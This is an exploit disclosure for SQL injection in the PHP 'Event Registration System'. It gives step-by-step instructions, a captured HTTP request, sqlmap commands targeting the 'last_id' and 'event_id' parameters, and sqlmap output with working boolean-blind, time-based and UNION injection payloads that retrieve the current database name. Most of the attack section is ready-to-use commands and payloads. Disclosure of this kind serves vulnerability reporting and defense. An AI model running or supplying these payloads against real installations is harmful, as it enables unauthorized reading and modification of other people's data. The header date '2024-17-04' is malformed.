# Event Registration System - SQL Injection - 2
+ **Exploit Title:** Event Registration System - SQL Injection - 2
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/14884/event-registration-system-qr-code-php-free-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=14884&title=Event+Registration+System+with+QR+Code+in+PHP+Free+Source+Code
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Event Registration System allows SQL Injection via the 'last_id' & 'event_id' parameters at "http://localhost/event/classes/Master.php?f=load_registration". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/event/registrar/"
+ Click a random event
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /event/classes/Master.php?f=load_registration HTTP/1.1
Host: localhost
Content-Length: 20
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/event/registrar/?page=registration&e=c4ca4238a0b923820dcc509a6f75849b
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=cc12r4c7k38a4endfa1btuk5he
Connection: close

last_id=2&event_id=1
```

+ Use sqlmap to exploit. In sqlmap, use 'last_id' parameter to dump the database.
```
sqlmap -r r.txt -p last_id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: last_id (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: last_id=2' OR NOT 4089=4089-- Npvx&event_id=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: last_id=2' AND (SELECT 5354 FROM (SELECT(SLEEP(5)))KgqL)-- jnYr&event_id=1

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: last_id=2' UNION ALL SELECT NULL,CONCAT(0x716b6b7171,0x6f4350686d655251537149534b756d56784d686f7a50437873734c6f7a4d524e675763707a694862,0x716a787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&event_id=1
---
[18:26:11] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:26:11] [INFO] fetching current database
current database: 'event_db'
```
+ current database: `event_db`

![Ekran görüntüsü 2024-05-18 194055](https://github.com/BurakSevben/CVEs/assets/117217689/10b8f2de-f6b5-4d88-88fe-1a0cbc8e8cc7)


## event_id
+ Use sqlmap to exploit. In sqlmap, use 'event_id' parameter to dump the database.
```
sqlmap -r r.txt -p event_id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: event_id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: last_id=2&event_id=1' RLIKE (SELECT (CASE WHEN (5330=5330) THEN 1 ELSE 0x28 END)) AND 'zuSp'='zuSp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: last_id=2&event_id=1' AND (SELECT 4811 FROM (SELECT(SLEEP(5)))MjrF) AND 'uICg'='uICg

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: last_id=2&event_id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6b7171,0x456c4e534e465642716e6e6e73644678435a7646784e734c6f554a437071534d77416278714c7442,0x716a787671),NULL,NULL,NULL,NULL-- -
---
[18:27:22] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:27:22] [INFO] fetching current database
current database: 'event_db'
```
+ current database: `event_db`

![Ekran görüntüsü 2024-05-18 194947](https://github.com/BurakSevben/CVEs/assets/117217689/463c4b93-e0ca-4ff2-98ba-5b3e7f907753)



